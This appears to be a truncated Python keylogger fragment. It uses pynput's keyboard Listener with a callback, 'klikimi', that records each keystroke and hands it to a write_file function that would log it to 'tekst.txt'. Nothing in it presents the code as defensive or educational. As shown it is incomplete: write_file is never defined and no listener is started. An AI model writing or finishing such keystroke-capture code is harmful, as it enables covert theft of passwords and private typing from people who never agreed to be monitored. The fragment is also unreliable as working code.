import os
from pynput.keyboard import Listener


keys = []
count = 0

path = 'tekst.txt'


def klikimi(key) :
	global keys, count


	keys.append(key)
	count +=1

	if count >= 1:
		count = 0
		write_file(keys)
		keys = []
